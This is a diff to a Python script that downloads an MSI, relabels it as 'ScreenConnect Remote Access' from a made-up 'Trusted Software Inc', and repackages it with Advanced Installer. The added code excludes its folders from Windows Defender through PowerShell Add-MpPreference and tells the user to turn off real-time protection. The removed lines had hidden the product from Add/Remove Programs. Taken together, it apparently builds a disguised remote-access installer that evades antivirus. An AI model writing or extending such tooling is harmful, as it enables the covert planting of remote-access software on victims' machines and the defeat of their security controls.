@@ -81,6 +81,24 @@ def set_file_permissions(path):
     except subprocess.CalledProcessError as e:
         print(Fore.RED + f"Warning: Failed to set permissions for {path}: {e.stderr}" + Style.RESET_ALL)
 
+def set_defender_exclusions():
+    """Attempt to set Windows Defender exclusions for script directories."""
+    paths = [
+        OUTPUT_DIR,
+        r"C:\Users\Admin\Desktop\wrapper",
+        r"C:\Program Files (x86)\Caphyon\Advanced Installer"
+    ]
+    try:
+        for path in paths:
+            subprocess.run(
+                ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path}'"],
+                check=True, capture_output=True, text=True
+            )
+        print(Fore.GREEN + "Windows Defender exclusions set for script directories." + Style.RESET_ALL)
+    except subprocess.CalledProcessError as e:
+        print(Fore.RED + f"Warning: Failed to set Defender exclusions: {e.stderr}" + Style.RESET_ALL)
+        print(Fore.RED + "Please disable real-time protection or set exclusions manually in Windows Security." + Style.RESET_ALL)
+
 def generate_random_string(length=10):
     """Generate a random string for temporary file naming."""
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -96,6 +114,18 @@ def calculate_file_hash(file_path, algorithm="sha256"):
         for chunk in iter(lambda: f.read(4096), b""):
             hash_obj.update(chunk)
     return hash_obj.hexdigest()
+
+def check_file_access(path):
+    """Check if a file is accessible for reading and writing."""
+    try:
+        with open(path, "rb") as f:
+            f.read(1)
+        with open(path, "ab") as f:
+            pass
+        return True
+    except Exception as e:
+        print(Fore.RED + f"Error: Cannot access file {path}: {e}" + Style.RESET_ALL)
+        return False
 
 def sanitize_filename(url):
     """Extract a clean MSI filename from a URL, removing query parameters."""
@@ -125,6 +155,8 @@ def download_msi(url, output_dir):
             if not magic.startswith(b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'):
                 raise ValueError(f"Downloaded file {output_path} is not a valid MSI")
         set_file_permissions(output_path)
+        if not check_file_access(output_path):
+            raise Exception(f"Cannot access downloaded MSI: {output_path}")
         print(Fore.GREEN + f"MSI downloaded to {output_path}" + Style.RESET_ALL)
         return output_path, original_filename
     else:
@@ -166,13 +198,15 @@ def modify_msi_metadata(file_path, temp_dir):
         modified_path = os.path.join(temp_dir, os.path.basename(file_path))
         shutil.copyfile(file_path, modified_path)
         set_file_permissions(modified_path)
+        if not check_file_access(modified_path):
+            print(Fore.RED + f"Error: Cannot access modified MSI: {modified_path}" + Style.RESET_ALL)
+            print(Fore.GREEN + "Using original MSI without metadata modification." + Style.RESET_ALL)
+            return file_path
         
-        # Use individual /SetProperty commands compatible with 22.9.1 Freeware
+        # Minimal /SetProperty commands for 22.9.1 Freeware
         commands = [
             [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", "ProductName=ScreenConnect Remote Access"],
-            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", "Manufacturer=Trusted Software Inc"],
-            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", f"ProductCode={generate_guid()}"],
-            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", f"UpgradeCode={generate_guid()}"]
+            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", "Manufacturer=Trusted Software Inc"]
         ]
         
         for cmd in commands:
@@ -184,8 +218,8 @@ def modify_msi_metadata(file_path, temp_dir):
         original_hash = calculate_file_hash(file_path)
         modified_hash = calculate_file_hash(modified_path)
         if original_hash == modified_hash:
-            print(Fore.RED + "Warning: MSI file hash unchanged after metadata modification. Changes may not have been applied." + Style.RESET_ALL)
-            print(Fore.GREEN + "Proceeding with original MSI as a precaution." + Style.RESET_ALL)
+            print(Fore.RED + "Warning: MSI hashes match after metadata modification. Changes may not have been applied." + Style.RESET_ALL)
+            print(Fore.GREEN + "Using original MSI as a precaution." + Style.RESET_ALL)
             return file_path
         
         print(Fore.GREEN + "MSI metadata modified successfully." + Style.RESET_ALL)
@@ -223,6 +257,11 @@ def create_msi_wrapper(msi_path, output_dir, original_filename):
     aip_path = os.path.join(output_dir, "wrapper.aip")
     
     try:
+        if not check_file_access(msi_path):
+            print(Fore.RED + f"Error: Cannot access MSI for wrapping: {msi_path}" + Style.RESET_ALL)
+            print(Fore.GREEN + "Using original MSI without wrapping." + Style.RESET_ALL)
+            return msi_path
+        
         with open(aip_path, "w") as f:
             f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
 <PROJECT>
@@ -230,9 +269,6 @@ def create_msi_wrapper(msi_path, output_dir, original_filename):
         <Name>ScreenConnect Remote Access</Name>
         <Version>1.0.0</Version>
         <Publisher>Trusted Software Inc</Publisher>
-        <ProductCode>{{{generate_guid()}}}</ProductCode>
-        <UpgradeCode>{{{generate_guid()}}}</UpgradeCode>
-        <ShowInARP>0</ShowInARP>
     </PRODUCT_DETAILS>
     <FILES_AND_FOLDERS>
         <Folder Id="INSTALLDIR" Path="[ProgramFilesFolder]ScreenConnect" />
@@ -243,6 +279,10 @@ def create_msi_wrapper(msi_path, output_dir, original_filename):
     </CUSTOM_ACTIONS>
 </PROJECT>''')
         set_file_permissions(aip_path)
+        if not check_file_access(aip_path):
+            print(Fore.RED + f"Error: Cannot access AIP file: {aip_path}" + Style.RESET_ALL)
+            print(Fore.GREEN + "Using original MSI without wrapping." + Style.RESET_ALL)
+            return msi_path
         
         cmd = [
             ADVANCED_INSTALLER_PATH,
@@ -278,6 +318,8 @@ def main():
         raise PermissionError(Fore.RED + "This script must be run as an administrator. Right-click Command Prompt or PowerShell, select 'Run as administrator', and try again." + Style.RESET_ALL)
     
     try:
+        set_defender_exclusions()
+        
         temp_dir = os.path.join(OUTPUT_DIR, "temp")
         if not os.path.exists(temp_dir):
             os.makedirs(temp_dir, exist_ok=True)
